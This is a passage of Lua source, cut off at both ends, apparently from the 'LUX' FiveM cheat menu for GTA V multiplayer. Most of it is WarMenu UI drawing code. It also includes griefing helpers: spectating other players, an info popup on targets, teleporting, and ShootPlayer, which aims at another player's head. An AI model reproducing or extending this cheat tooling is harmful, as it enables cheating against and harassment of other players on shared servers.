				DrawSprite("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end
		elseif menus[currentMenu].background == "weaponlist" then
			RequestStreamedTextureDict("heisthud")
			if _menuColor.base == colorPurple then
				DrawSprite("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 255, 255, 140) -- 255, 76, 60,
			else
				DrawSprite("heisthud", "main_gradient", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			end

			RequestStreamedTextureDict("mpweaponscommon")
			RequestStreamedTextureDict("mpweaponsgang0")
			RequestStreamedTextureDict("mpweaponsgang1")
			RequestStreamedTextureDict("mpweaponsunusedfornow")
			 -- rgb(155, 89, 182)
		elseif menus[currentMenu].titleBackgroundSprite then
			DrawSprite(
				menus[currentMenu].titleBackgroundSprite.dict,
				menus[currentMenu].titleBackgroundSprite.name,
				x,
				y,
				menuWidth,
				titleHeight,
				0.,
				255,
				255,
				255,
				255
			)
		else
			--drawRect(x, y, menuWidth, titleHeight, menus[currentMenu].titleBackgroundColor)
		end

		drawText(
			menus[currentMenu].title,
			x,
			y - titleHeight / 2 + titleYOffset,
			menus[currentMenu].titleFont,
			menus[currentMenu].titleColor,
			titleScale,
			true
		)
	end
end

local function drawSubTitle()
	if menus[currentMenu] then
		local x = menus[currentMenu].x + menuWidth / 2
		local y = menus[currentMenu].y + titleHeight + buttonHeight / 2

		local subTitleColor = {
			r = menus[currentMenu].titleBackgroundColor.r,
			g = menus[currentMenu].titleBackgroundColor.g,
			b = menus[currentMenu].titleBackgroundColor.b,
			a = 255
		}

		drawRect(x, y, menuWidth, buttonHeight, menus[currentMenu].subTitleBackgroundColor)
		drawRect(x, y + 0.02, menuWidth, 0.0025, _menuColor.base)
		drawText(
			menus[currentMenu].subTitle,
			menus[currentMenu].x + buttonTextXOffset,
			y - buttonHeight / 2 + buttonTextYOffset,
			buttonFont,
			_menuColor.base,
			buttonScale,
			false
		)

		if optionCount > menus[currentMenu].maxOptionCount then
			drawText(
				tostring(menus[currentMenu].currentOption) .. " / " .. tostring(optionCount),
				menus[currentMenu].x + menuWidth,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				_menuColor.base,
				buttonScale,
				false,
				false,
				true
			)
		end
	end
end

local function drawFooter()
	if menus[currentMenu] then
		local multiplier = nil
		local x = menus[currentMenu].x + menuWidth / 2
		-- local y = menus[currentMenu].y + titleHeight - 0.015 + buttonHeight + menus[currentMenu].maxOptionCount * buttonHeight
		-- DrawSprite("commonmenu", "interaction_bgd", x, y + 0.025, menuWidth, (titleHeight * -1) - 0.025, 0.0, 255, 76, 60, 255) -- r = 231, g = 76, b = 60
		local footerColor = { r = 0, g = 0, b = 0, a = 255 }

		if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
			multiplier = optionCount
		elseif optionCount >= menus[currentMenu].currentOption then
			multiplier = 10
		end

		if multiplier then
			local y = menus[currentMenu].y + titleHeight + 0.015 + buttonHeight + (buttonHeight * multiplier)

			drawRect(x, y, menuWidth, buttonHeight / 2, footerColor)

			drawText("LUX MENU 1.0b", x, y - titleHeight / 2.7 + titleYOffset, menus[currentMenu].titleFont, menus[currentMenu].titleColor, titleScale / 3, true)
		end

	end
end

-- [NOTE] MenuDrawButton
local function drawButton(text, subText)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil
	local pointer = true

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif
		optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and
			optionCount <= menus[currentMenu].currentOption
	 then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2 + 0.0020 -- 0.0025 is the offset for the line under subTitle
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			pointColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			pointColor = menus[currentMenu].blankColor
			--shadow = true
		end

		if backgroundColor == nil then print("^1Color is nil") end

		drawRect(x, y, menuWidth, buttonHeight, backgroundColor)

		if (text ~= "~r~Grief Menu" and text ~= "~b~Menu Settings") and menus[currentMenu].subTitle == "MAIN MENU" then -- and subText == "isMenu"
			drawText(
			text,
			menus[currentMenu].x + 0.020,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)
		else
			drawText(
			text,
			menus[currentMenu].x + buttonTextXOffset,
			y - (buttonHeight / 2) + buttonTextYOffset,
			buttonFont,
			textColor,
			buttonScale,
			false,
			shadow
			)
		end

		if text == "Self Options" then
			RequestStreamedTextureDict("mpleaderboard")
			DrawSprite("mpleaderboard", "leaderboard_players_icon", x - menuWidth / 2.225, y, 0.02, buttonHeight - 0.010, 0.0, 26, 188, 156, 255) -- rgb(26, 188, 156)
		elseif text == "Online Options" then
			RequestStreamedTextureDict("mpleaderboard")
			DrawSprite("mpleaderboard", "leaderboard_friends_icon", x - menuWidth / 2.225, y, 0.02, buttonHeight - 0.010, 0.0, 52, 152, 219, 255) -- rgb(52, 152, 219)
		elseif text == "Visual Options" then
			RequestStreamedTextureDict("mphud")
			DrawSprite("mphud", "spectating", x - menuWidth / 2.225, y, 0.02, buttonHeight - 0.010, 0.0, 236, 240, 241, 255) -- rgb(236, 240, 241)
		elseif text == "Teleport Options" then
			RequestStreamedTextureDict("mpleaderboard")
			DrawSprite("mpleaderboard", "leaderboard_star_icon", x - menuWidth / 2.225, y, 0.02, buttonHeight - 0.010, 0.0, 241, 196, 15, 255) -- rgb(241, 196, 15)
		elseif text == "Vehicle Options" then
			RequestStreamedTextureDict("mpleaderboard")
			DrawSprite("mpleaderboard", "leaderboard_car_icon", x - menuWidth / 2.225, y, 0.018, buttonHeight - 0.010, 0.0, 230, 126, 34, 255) -- rgb(230, 126, 34)
		elseif text == "Weapon Options" then
			RequestStreamedTextureDict("mpleaderboard")
			DrawSprite("mpleaderboard", "leaderboard_kd_icon", x - menuWidth / 2.225, y, 0.02, buttonHeight - 0.010, 0.0, 231, 76, 60, 255) -- rgb(231, 76, 60)
		elseif text == "Server Options" then
			RequestStreamedTextureDict("mpleaderboard")
			DrawSprite("mpleaderboard", "leaderboard_globe_icon", x - menuWidth / 2.225, y, 0.02, buttonHeight - 0.010, 0.0, 155, 89, 182, 255) -- rgb(155, 89, 182)
		end

		if subText == "isMenu" then
			RequestStreamedTextureDict("commonmenu")
			DrawSprite("commonmenu", "arrowright", x + menuWidth / 2.3, y, 0.02, buttonHeight, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
		elseif subText == "isWeapon" then
			menus[currentMenu].title = ""
			menus[currentMenu].background = "weaponlist"
			local x = menus[currentMenu].x + menuWidth / 2
			local y = menus[currentMenu].y + titleHeight / 2 + titleYOffset - 0.02
			for hash, v in pairs(t_Weapons) do
				if text == v[1] then
					SetScriptGfxDrawOrder(50)
					RequestStreamedTextureDict(v[3])
					DrawSprite(v[3], v[2], x, y, 0.1, 0.1, 0.0, pointColor.r, pointColor.g, pointColor.b, pointColor.a)
				end
			end
		elseif subText == "toggleOff" then
			--drawRect(x + menuWidth / 2.35, y, 0.02, 0.02, {r = 0, g = 0, b = 0, a = 255})
			subText = nil
		elseif subText == "toggleOn" then
			--drawRect(x + menuWidth / 2.35, y, 0.02, 0.02, {r = 0, g = 0, b = 0, a = 255})
			DrawSprite("commonmenu", "shop_tick_icon", x + menuWidth / 2.35, y, 0.02, buttonHeight, 0.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 255)
			subText = nil
		elseif subText then			
			drawText(
				subText,
				menus[currentMenu].x + 0.005,
				y - buttonHeight / 2 + buttonTextYOffset,
				buttonFont,
				subTextColor,
				buttonScale,
				false,
				shadow,
				true
			)

		end
	end
end


function WarMenu.CreateMenu(id, title)
	-- Default settings
	menus[id] = {}
	menus[id].title = title
	menus[id].subTitle = "INTERACTION MENU"
	menus[id].branding = "LUX"

	menus[id].visible = false

	menus[id].previousMenu = nil

	menus[id].aboutToBeClosed = false

	menus[id].x = 0.75
    menus[id].y = 0.19
    
    menus[id].width = menuWidth

	menus[id].currentOption = 1
	menus[id].maxOptionCount = 10
	menus[id].titleFont = 4
	menus[id].titleColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].background = "default"
	Citizen.CreateThread(
		function()
			while isMenuEnabled do
				Citizen.Wait(500)
				menus[id].titleBackgroundColor = {r = _menuColor.base.r, g = _menuColor.base.g, b = _menuColor.base.b, a = 180}
				
			end
			menus[id].titleBackgroundSprite = nil
	end)

	menus[id].menuFocusBackgroundColor = {r = 31, g = 32, b = 34, a = 230} -- rgb(155, 89, 182)

	menus[id].menuTextColor = {r = 255, g = 255, b = 255, a = 255}
	menus[id].menuSubTextColor = {r = 140, g = 140, b = 140, a = 255}
	menus[id].menuFocusTextColor = {r = 255, g = 255, b = 255, a = 255}
	--menus[id].menuFocusBackgroundColor = { r = 245, g = 245, b = 245, a = 255 }
	menus[id].menuBackgroundColor = {r = 18, g = 18, b = 18, a = 230} -- #121212
	menus[id].blankColor = { r = 0, g = 0, b = 0, a = 0 }

	menus[id].subTitleBackgroundColor = {
		r = menus[id].menuBackgroundColor.r,
		g = menus[id].menuBackgroundColor.g,
		b = menus[id].menuBackgroundColor.b,
		a = 255
	}

	menus[id].buttonPressedSound = {name = "SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"} --https://pastebin.com/0neZdsZ5

	debugPrint(tostring(id) .. " menu created")
end

function WarMenu.CreateSubMenu(id, parent, subTitle)
	if menus[parent] then
		WarMenu.CreateMenu(id, menus[parent].title)

		if subTitle then
			setMenuProperty(id, "subTitle", string.upper(subTitle))
		else
			setMenuProperty(id, "subTitle", string.upper(menus[parent].subTitle))
		end

		setMenuProperty(id, "previousMenu", parent)

		setMenuProperty(id, "x", menus[parent].x)
		setMenuProperty(id, "y", menus[parent].y)
		setMenuProperty(id, "maxOptionCount", menus[parent].maxOptionCount)
		setMenuProperty(id, "titleFont", menus[parent].titleFont)
		setMenuProperty(id, "titleColor", menus[parent].titleColor)
		setMenuProperty(id, "titleBackgroundColor", menus[parent].titleBackgroundColor)
		setMenuProperty(id, "titleBackgroundSprite", menus[parent].titleBackgroundSprite)
		setMenuProperty(id, "menuTextColor", menus[parent].menuTextColor)
		setMenuProperty(id, "menuSubTextColor", menus[parent].menuSubTextColor)
		setMenuProperty(id, "menuFocusTextColor", menus[parent].menuFocusTextColor)
		setMenuProperty(id, "menuFocusBackgroundColor", menus[parent].menuFocusBackgroundColor)
		setMenuProperty(id, "menuBackgroundColor", menus[parent].menuBackgroundColor)
		setMenuProperty(id, "subTitleBackgroundColor", menus[parent].subTitleBackgroundColor)
	else
		debugPrint("Failed to create " .. tostring(id) .. " submenu: " .. tostring(parent) .. " parent menu doesn't exist")
	end
end

function WarMenu.CurrentMenu()
	return currentMenu
end

function WarMenu.OpenMenu(id)
	if id and menus[id] then
		if menus[id].titleBackgroundSprite then
			RequestStreamedTextureDict(menus[id].titleBackgroundSprite.dict, false)
			while not HasStreamedTextureDictLoaded(menus[id].titleBackgroundSprite.dict) do
				Citizen.Wait(0)
			end
		end

		setMenuVisible(id, true)
		PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

		debugPrint(tostring(id) .. " menu opened")
	else
		debugPrint("Failed to open " .. tostring(id) .. " menu: it doesn't exist")
	end
end

function WarMenu.IsMenuOpened(id)
	return isMenuVisible(id)
end

function WarMenu.IsAnyMenuOpened()
	for id, _ in pairs(menus) do
		if isMenuVisible(id) then
			return true
		end
	end

	return false
end

function WarMenu.IsMenuAboutToBeClosed()
	if menus[currentMenu] then
		return menus[currentMenu].aboutToBeClosed
	else
		return false
	end
end

function WarMenu.CloseMenu()
	if menus[currentMenu] then
		if menus[currentMenu].aboutToBeClosed then
			menus[currentMenu].aboutToBeClosed = false
			setMenuVisible(currentMenu, false)
			debugPrint(tostring(currentMenu) .. " menu closed")
			PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			optionCount = 0
			currentMenu = nil
			currentKey = nil
		else
			menus[currentMenu].aboutToBeClosed = true
			debugPrint(tostring(currentMenu) .. " menu about to be closed")
		end
	end
end

function WarMenu.Button(text, subText)
	local buttonText = text
	if subText then
		buttonText = "{ " .. tostring(buttonText) .. ", " .. tostring(subText) .. " }"
	end

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton(text, subText)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText .. " button pressed")
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint("Failed to create " .. buttonText .. " button: " .. tostring(currentMenu) .. " menu doesn't exist")

		return false
	end
end

-- Button with a slider
function WarMenu.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = tostring(selectedItem)
	end

	if WarMenu.Button2(text, items, itemsCount, currentIndex) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
            if currentIndex > 1 then currentIndex = currentIndex - 1 
            elseif currentIndex == 1 then currentIndex = 1 end
		elseif currentKey == keys.right then
            if currentIndex < itemsCount then currentIndex = currentIndex + 1 
            elseif currentIndex == itemsCount then currentIndex = itemsCount end
		end
	else
		currentIndex = selectedIndex
    end
	callback(currentIndex, selectedIndex)
	return false
end

local function drawButton2(text, items, itemsCount, currentIndex)
	local x = menus[currentMenu].x + menuWidth / 2
	local multiplier = nil

	if menus[currentMenu].currentOption <= menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].maxOptionCount then
		multiplier = optionCount
	elseif optionCount > menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount and optionCount <= menus[currentMenu].currentOption then
		multiplier = optionCount - (menus[currentMenu].currentOption - menus[currentMenu].maxOptionCount)
	end

	if multiplier then
		local y = menus[currentMenu].y + titleHeight + buttonHeight + (buttonHeight * multiplier) - buttonHeight / 2 + 0.0020
		local backgroundColor = nil
		local textColor = nil
		local subTextColor = nil
		local shadow = false

		if menus[currentMenu].currentOption == optionCount then
			backgroundColor = menus[currentMenu].menuFocusBackgroundColor
			textColor = menus[currentMenu].menuFocusTextColor
			subTextColor = menus[currentMenu].menuFocusTextColor
		else
			backgroundColor = menus[currentMenu].menuBackgroundColor
			textColor = menus[currentMenu].menuTextColor
			subTextColor = menus[currentMenu].menuSubTextColor
			shadow = true
		end

        local sliderWidth = ((menus[currentMenu].width / 3.5) / itemsCount) 
        local subtractionToX = ((sliderWidth * (currentIndex + 1)) - (sliderWidth * currentIndex)) / 2

        local XOffset = 0.16 -- Default value in case of any error?
        local stabilizer = 1

        -- Draw order from top to bottom
        if itemsCount >= 40 then
            stabilizer = 1.005
        end
		
        drawRect(x, y, menuWidth, buttonHeight, backgroundColor) -- Button Rectangle -2.15
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * itemsCount)) / stabilizer, y, sliderWidth * (itemsCount - 1), buttonHeight / 2, _menuColor.shadow) -- Slide Outline
        drawRect(((menus[currentMenu].x + 0.1675) + (subtractionToX * currentIndex)) / stabilizer, y, sliderWidth * (currentIndex - 1), buttonHeight / 2, _menuColor.highlight) -- Slide
        drawText(text, menus[currentMenu].x + buttonTextXOffset, y - (buttonHeight / 2) + buttonTextYOffset, buttonFont, textColor, buttonScale, false, shadow) -- Text

        --Ugly Code, I'll refactor it later
        local CurrentItem = tostring(items[currentIndex])
        if string.len(CurrentItem) == 1 then XOffset = 0.1650
        elseif string.len(CurrentItem) == 2 then XOffset = 0.1625
        elseif string.len(CurrentItem) == 3 then XOffset = 0.16015
        elseif string.len(CurrentItem) == 4 then XOffset = 0.1585
        elseif string.len(CurrentItem) == 5 then XOffset = 0.1570
        elseif string.len(CurrentItem) >= 6 then XOffset = 0.1555
        end
        -- roundNum seems kinda useless since I'm adjusting every position manually based on the lenght of the string. As stated above, I'll refactor this part later.
		-- (sliderWidth * roundNum((itemsCount / 2), 3)
        drawText(items[currentIndex], ((menus[currentMenu].x + XOffset) + 0.03) / stabilizer, y - (buttonHeight / 2.15) + buttonTextYOffset, buttonFont, {r = 255, g = 255, b = 255, a = 255}, buttonScale, false, true) -- Current Item Text
	end
end

function WarMenu.Button2(text, items, itemsCount, currentIndex)
	local buttonText = text

	if menus[currentMenu] then
		optionCount = optionCount + 1

		local isCurrent = menus[currentMenu].currentOption == optionCount

		drawButton2(text, items, itemsCount, currentIndex)

		if isCurrent then
			if currentKey == keys.select then
				PlaySoundFrontend(-1, menus[currentMenu].buttonPressedSound.name, menus[currentMenu].buttonPressedSound.set, true)
				debugPrint(buttonText..' button pressed')
				return true
			elseif currentKey == keys.left or currentKey == keys.right then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
			end
		end

		return false
	else
		debugPrint('Failed to create '..buttonText..' button: '..tostring(currentMenu)..' menu doesn\'t exist')

		return false
	end
end

function WarMenu.MenuButton(text, id)
	if menus[id] then
		if WarMenu.Button(text, "isMenu") then
			setMenuVisible(currentMenu, false)
			setMenuVisible(id, true, true)

			return true
		end
	else
		debugPrint("Failed to create " .. tostring(text) .. " menu button: " .. tostring(id) .. " submenu doesn't exist")
	end

	return false
end

function WarMenu.CheckBox(text, bool, callback)
	local checked = "toggleOff"
	if bool then
		checked = "toggleOn"
	end

	if WarMenu.Button(text, checked) then
		bool = not bool
		debugPrint(tostring(text) .. " checkbox changed to " .. tostring(bool))
		callback(bool)

		return true
	end

	return false
end

function WarMenu.ComboBox(text, items, currentIndex, selectedIndex, callback)
	local itemsCount = #items
	local selectedItem = items[currentIndex]
	local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)

	if itemsCount > 1 and isCurrent then
		selectedItem = "- " .. tostring(selectedItem) .. " -"
	end

	if WarMenu.Button(text, selectedItem) then
		selectedIndex = currentIndex
		callback(currentIndex, selectedIndex)
		return true
	elseif isCurrent then
		if currentKey == keys.left then
			if currentIndex > 1 then
				currentIndex = currentIndex - 1
			else
				currentIndex = itemsCount
			end
		elseif currentKey == keys.right then
			if currentIndex < itemsCount then
				currentIndex = currentIndex + 1
			else
				currentIndex = 1
			end
		end
	else
		currentIndex = selectedIndex
	end

	callback(currentIndex, selectedIndex)
	return false
end

function WarMenu.PopupWindow(data)
	Citizen.CreateThread(function()
		-- Draw info box
		
		local x = 0.7025
		local y = 0.308
		local mwidth = 0.095
		local mheight = 0.210
		local buttonFont = 4
		local textColor = {r = 255, g = 255, b = 255, a = 255}
		local buttonScale = 0.375
		local XOffset = 0.055
		local YOffset = 0.025
		local textX = 0.660
		
		local textY = 0.205
		
		local color = {r = 0, g = 0, b = 0, a = 170}
		
		local dataPed = GetPlayerPed(data)
		
		local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId()))
		local tx, ty, tz = table.unpack(GetEntityCoords(dataPed))
	
		
	
		--(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~DEAD " or "~g~ALIVE ")
		-- (IsPedInAnyVehicle(GetPlayerPed(i), true) and "~o~VEHICLE" or "")
		-- GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(dataPed)))
	
		-- GetPlayerMoney(GetPlayerServerId(data)))
		infoBox = {
			tostring("Name: " .. LUX:CheckName(GetPlayerName(data))),
			tostring("Server ID: " .. GetPlayerServerId(data)),
			tostring("Player ID: ~t~" .. GetPlayerFromServerId(GetPlayerServerId(data))),
			tostring("Distance: ~f~" .. math.round(#(vector3(cx, cy, cz) - vector3(tx, ty, tz)), 1)),
			tostring("Status: " .. (IsPedDeadOrDying(dataPed, 1) and "~r~Dead " or "~g~Alive")),
			tostring("Task: " .. LUX.Game:GetPedStatus(dataPed)),
		}
		
		
		drawRect(x, y, mwidth, mheight, color)
		--drawRect(x, 0.204, mwidth, 0.003, _menuColor.base)
		
		for _, infoData in ipairs(infoBox) do
			drawText(infoData, textX, textY, buttonFont, textColor, buttonScale, false, false)
			textY = textY + YOffset	
		end
	
	end)
	--drawText(text, textX, textY + YOffset, buttonFont, textColor, buttonScale, false, false)
end

function WarMenu.Display()	
	if isMenuVisible(currentMenu) then
		if menus[currentMenu].aboutToBeClosed then
			WarMenu.CloseMenu()
		else
			ClearAllHelpMessages()
			--drawTitle()
			drawSubTitle()
			drawFooter()

			currentKey = nil

			if IsDisabledControlJustPressed(0, keys.down) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption < optionCount then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption + 1
				else
					menus[currentMenu].currentOption = 1
				end
			elseif IsDisabledControlJustPressed(0, keys.up) then
				PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)

				if menus[currentMenu].currentOption > 1 then
					menus[currentMenu].currentOption = menus[currentMenu].currentOption - 1
				else
					menus[currentMenu].currentOption = optionCount
				end
			elseif IsDisabledControlJustPressed(0, keys.left) then
				currentKey = keys.left
			elseif IsDisabledControlJustPressed(0, keys.right) then
				currentKey = keys.right
			elseif IsDisabledControlJustPressed(0, keys.select) then
				currentKey = keys.select
			elseif IsDisabledControlJustPressed(0, keys.back) then
				if menus[menus[currentMenu].previousMenu] then
					PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
					setMenuVisible(menus[currentMenu].previousMenu, true)
				else
					WarMenu.CloseMenu()
				end
			end

			optionCount = 0
		end
	end
end

function WarMenu.SetMenuWidth(id, width)
	setMenuProperty(id, "width", width)
end

function WarMenu.SetMenuX(id, x)
	setMenuProperty(id, "x", x)
end

function WarMenu.SetMenuY(id, y)
	setMenuProperty(id, "y", y)
end

function WarMenu.SetMenuMaxOptionCountOnScreen(id, count)
	setMenuProperty(id, "maxOptionCount", count)
end

function WarMenu.SetTitleColor(id, r, g, b, a)
	setMenuProperty(id, "titleColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleColor.a})
end

function WarMenu.SetTitleBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"titleBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].titleBackgroundColor.a}
	)
end

function WarMenu.SetTitleBackgroundSprite(id, textureDict, textureName)
	setMenuProperty(id, "titleBackgroundSprite", {dict = textureDict, name = textureName})
end

function WarMenu.SetSubTitle(id, text)
	setMenuProperty(id, "subTitle", string.upper(text))
end

function WarMenu.SetMenuBackgroundColor(id, r, g, b, a)
	setMenuProperty(
		id,
		"menuBackgroundColor",
		{["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuBackgroundColor.a}
	)
end

function WarMenu.SetMenuTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuTextColor.a})
end

function WarMenu.SetMenuSubTextColor(id, r, g, b, a)
	setMenuProperty(id, "menuSubTextColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuSubTextColor.a})
end

function WarMenu.SetMenuFocusColor(id, r, g, b, a)
	setMenuProperty(id, "menuFocusColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusColor.a})
end

function WarMenu.SetMenuButtonPressedSound(id, name, set)
	setMenuProperty(id, "buttonPressedSound", {["name"] = name, ["set"] = set})
end

function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
	local editing, finished, cancelled, notActive = 0, 1, 2, 3

	AddTextEntry("FMMC_KEY_TIP1", TextEntry .. ":")
	DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ExampleText, "", "", "", MaxStringLength)
	blockinput = true

	while UpdateOnscreenKeyboard() ~= finished and UpdateOnscreenKeyboard() ~= cancelled do
		Citizen.Wait(0)
	end

	if UpdateOnscreenKeyboard() ~= cancelled then
		local result = GetOnscreenKeyboardResult()
		Citizen.Wait(500)
		blockinput = false
		return result
	else
		Citizen.Wait(500)
		blockinput = false
		return nil
	end
end

local function getPlayerIds()
	local players = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then
			players[#players + 1] = i
		end
	end
	return players
end


function DrawText3D(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function DrawText3DFill(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	SetTextFont(0)
	SetTextProportional(0)
	SetTextScale(0.0, 0.20)
	SetTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	SetTextDropShadow()
	SetTextOutline()
	SetTextEntry("STRING")
	SetTextCentre(1)
	AddTextComponentString(text)
	DrawText(0.0, 0.0)
	ClearDrawOrigin()
end

function math.round(num, numDecimalPlaces)
	return tonumber(string.format("%." .. (numDecimalPlaces or 0) .. "f", num))
end

local function RGBRainbow(frequency)
	local result = {}
	local curtime = GetGameTimer() / 1000

	result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
	result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
	result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)

	return result
end

local function TeleportToWaypoint()
	local WaypointHandle = GetFirstBlipInfoId(8)

  	if DoesBlipExist(WaypointHandle) then
  		local waypointCoords = GetBlipInfoIdCoord(WaypointHandle)
		for height = 1, 1000 do
			SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

			local foundGround, zPos = GetGroundZFor_3dCoord(waypointCoords["x"], waypointCoords["y"], height + 0.0)

			if foundGround then
				SetPedCoordsKeepVehicle(PlayerPedId(), waypointCoords["x"], waypointCoords["y"], height + 0.0)

				break
			end

			Citizen.Wait(0)
		end
	else
		drawNotification({text = "You must place a waypoint", type = 'error'})
	end
end

local Spectating = false

function SpectatePlayer(player)

	Spectating = not Spectating

	local targetPed = GetPlayerPed(player)

	if (Spectating) then
		RequestCollisionAtCoord(GetEntityCoords(targetPed, false))
		NetworkSetInSpectatorMode(true, targetPed)

		--drawNotification("Started spectating ~b~" .. GetPlayerName(player))
	else
		RequestCollisionAtCoord(GetEntityCoords(targetPed, false))
		NetworkSetInSpectatorMode(false, targetPed)

		--drawNotification("Stopped spectating ~b~" .. GetPlayerName(player))
	end
end

function ShootPlayer(player)
	local head = GetPedBoneCoords(player, GetEntityBoneIndexByName(player, "SKEL_HEAD"), 0.0, 0.0, 0.0)
	SetPedShootsAtCoord(PlayerPedId(), head.x, head.y, head.z, true)
end

function MaxOut(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
